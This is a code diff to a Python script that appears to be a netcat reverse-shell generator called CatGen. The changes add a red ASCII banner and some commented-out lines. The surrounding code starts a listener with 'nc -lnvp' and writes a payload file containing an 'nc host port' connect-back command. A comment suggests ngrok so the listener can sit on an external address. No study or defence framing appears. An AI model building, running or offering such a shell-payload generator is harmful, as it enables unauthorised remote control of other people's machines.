@@ -2,8 +2,12 @@ import os
 import time
 import subprocess
 from subprocess import Popen,PIPE
+import colorama
+from colorama import Fore, Style
 
-print("""\n ▄████▄   ▄▄▄     ▄▄▄█████▓  ▄████ ▓█████  ███▄    █ 
+def printBanner():
+
+        print(Fore.RED + """\n ▄████▄   ▄▄▄     ▄▄▄█████▓  ▄████ ▓█████  ███▄    █ 
 ▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒ ██▒ ▀█▒▓█   ▀  ██ ▀█   █ 
 ▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░▄▄▄░▒███   ▓██  ▀█ ██▒
 ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒
@@ -13,8 +17,9 @@ print("""\n ▄████▄   ▄▄▄     ▄▄▄█████▓  ▄�
 ░          ░   ▒    ░      ░ ░   ░    ░      ░   ░ ░ 
 ░ ░            ░  ░              ░    ░  ░         ░ 
 ░                                                    \n\n""")
-
-
+        print(Style.RESET_ALL)
+        return (printBanner)
+printBanner()
 
 ncport = 3002 #if you change this port make sure it's free
 nchost = '127.0.0.1' #can be a local ip or external ip, i recommend using ngrok
@@ -34,6 +39,9 @@ def main():
                    'nc -lnvp' + str(ncport), shell=True
                     ).splitlines()
                 return (cmd)
+        #subprocess.check_output(
+        #'nc -lnvp' + str(ncport) , shell=True
+    #).splitlines()
             except subprocess.CalledProcessError:
                 print("Disconnected!")
                 exit()
@@ -43,6 +51,8 @@ def main():
                 ) 
             with open(nameoffile, 'w') as f:
                 f.write(f"nc {nchost} {ncport} {bandaid}")
+            #f.write('nc' + ' ' +  str(nchost) + ' ' + str(ncport) + ' ' + bandaid)
+        #print("%s created." % (nameoffile))
             print(f"{nameoffile} created.")
             return (nameoffile)
             break
